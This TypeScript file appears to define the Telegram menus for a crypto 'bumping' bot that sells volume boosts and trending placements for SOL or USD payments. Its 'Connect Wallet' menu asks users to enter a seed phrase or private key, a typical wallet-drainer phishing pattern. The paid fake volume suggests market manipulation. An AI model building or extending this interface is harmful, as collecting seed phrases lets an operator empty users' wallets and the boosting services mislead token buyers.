import { Markup } from "telegraf";

export const mainMenuKeyboard = Markup.keyboard([
  ["🟢 Start Bumping"],
  ["📊 Volume Boost", "🔥 Trending Boost"],
  ["🌐 DexScreener", "💰 Deposit"],
  ["🔗 Connect Wallet", "💬 Contact Support"],
]).resize();

export const solPickerKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("0.3 SOL", "sol_0.3"),
    Markup.button.callback("0.4 SOL", "sol_0.4"),
  ],
  [
    Markup.button.callback("0.5 SOL", "sol_0.5"),
    Markup.button.callback("0.6 SOL", "sol_0.6"),
  ],
  [Markup.button.callback("« Back to Menu", "back_main")],
]);

export const confirmBumpKeyboard = (sol: number) =>
  Markup.inlineKeyboard([
    [Markup.button.callback(`✅ Confirm — Pay ${sol} SOL`, "confirm_bump")],
    [Markup.button.callback("« Back", "back_sol_picker")],
  ]);

export const txHashKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("✅ I've Sent Payment — Submit TX Hash", "submit_tx")],
  [Markup.button.callback("« Cancel", "back_main")],
]);

export const volumeBoostKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("🔩 Iron — 1.5 SOL", "vol_iron"),
    Markup.button.callback("🥉 Bronze — 2.5 SOL", "vol_bronze"),
  ],
  [
    Markup.button.callback("🥈 Silver — 5.0 SOL", "vol_silver"),
    Markup.button.callback("🥇 Gold — 3.5 SOL", "vol_gold"),
  ],
  [
    Markup.button.callback("💎 Platinum — 7.5 SOL", "vol_platinum"),
    Markup.button.callback("💠 Diamond — 10.5 SOL", "vol_diamond"),
  ],
  [Markup.button.callback("« Back to Menu", "back_main")],
]);

export const trendingBoostKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("☀️ SOL Trending", "trend_sol")],
  [Markup.button.callback("🔷 ETH Trending", "trend_eth")],
  [Markup.button.callback("🚀 PumpFun Trending", "trend_pumpfun")],
  [Markup.button.callback("« Back to Menu", "back_main")],
]);

export const solTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("TOP 3 — 3hr", "st_top3_3hr"),
    Markup.button.callback("TOP 3 — 6hr", "st_top3_6hr"),
  ],
  [
    Markup.button.callback("TOP 3 — 12hr", "st_top3_12hr"),
    Markup.button.callback("TOP 3 — 24hr", "st_top3_24hr"),
  ],
  [
    Markup.button.callback("TOP 10 — 3hr", "st_top10_3hr"),
    Markup.button.callback("TOP 10 — 6hr", "st_top10_6hr"),
  ],
  [
    Markup.button.callback("TOP 10 — 12hr", "st_top10_12hr"),
    Markup.button.callback("TOP 10 — 24hr", "st_top10_24hr"),
  ],
  [Markup.button.callback("« Back", "trend_back")],
]);

export const ethTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("ETH Trending — $100", "et_100"),
    Markup.button.callback("ETH Trending — $200", "et_200"),
  ],
  [Markup.button.callback("ETH Trending — $300", "et_300")],
  [Markup.button.callback("« Back", "trend_back")],
]);

export const pumpfunTrendingKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("🚀 P.F.T — 30 SOL", "pft_30")],
  [Markup.button.callback("« Back", "trend_back")],
]);

export const dexscreenerKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("TOP 6 — 5hr", "dex_top6_5hr"),
    Markup.button.callback("TOP 6 — 10hr", "dex_top6_10hr"),
  ],
  [
    Markup.button.callback("TOP 6 — 16hr", "dex_top6_16hr"),
    Markup.button.callback("TOP 6 — 24hr", "dex_top6_24hr"),
  ],
  [
    Markup.button.callback("TOP 6 — 32hr", "dex_top6_32hr"),
  ],
  [Markup.button.callback("« Back to Menu", "back_main")],
]);

export const depositKeyboard = (solAddress: string, ethAddress: string) =>
  Markup.inlineKeyboard([
    [Markup.button.callback("➕ ADD", "deposit_add"), Markup.button.callback("💸 WITHDRAW", "deposit_withdraw")],
    [Markup.button.callback("◎ SOL BALANCE", "deposit_sol_balance")],
    [Markup.button.callback("📥 My Deposits", "deposit_my_deposits"), Markup.button.callback("📤 My Withdrawals", "deposit_my_withdrawals")],
    [Markup.button.callback("« Back to Menu", "back_main")],
  ]);

export const connectWalletKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("🔑 Enter Seed Phrase", "wallet_seed")],
  [Markup.button.callback("🗝 Enter Private Key", "wallet_privkey")],
  [Markup.button.callback("« Back to Menu", "back_main")],
]);

export const backMainKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("« Back to Menu", "back_main")],
]);

export const trendingConfirmKeyboard = (label: string, price: string, cbData: string) =>
  Markup.inlineKeyboard([
    [Markup.button.callback(`✅ Confirm — ${price}`, `confirm_trending_${cbData}`)],
    [Markup.button.callback("« Back", "trend_back")],
  ]);
